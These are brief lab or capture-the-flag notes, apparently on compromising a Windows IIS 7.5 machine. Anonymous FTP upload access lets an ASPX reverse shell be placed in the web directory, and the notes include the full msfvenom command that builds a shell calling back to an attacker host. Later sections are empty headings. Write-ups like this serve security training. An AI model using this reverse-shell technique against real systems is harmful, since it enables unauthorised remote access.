1. Recon

> 21 - FTP - Microsoft ftpd
-  Anonymous login allowed
-  PUT command allowed, checked by HELP command
-  IIS web server directory is accessible, checked by ls command

> 80 - HTTP - Microsoft IIS httpd 7.5
-  7.5 server uses ASP.net,  checked by google

2. Initial Access

-  Accessed FTP using Anonymous auth
-  traversed into the web server dir
-  created ASP.net reverse shell and uploaded into web dir
```
msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.63 LPORT=3333 -o toms-rev-shell.aspx
```
- Started listening  on attacker machine and accessed reverse shell using browser
- Got reverse shell on victim

3. Post Exploit

4. Privilege Escalation 

5. Pawn

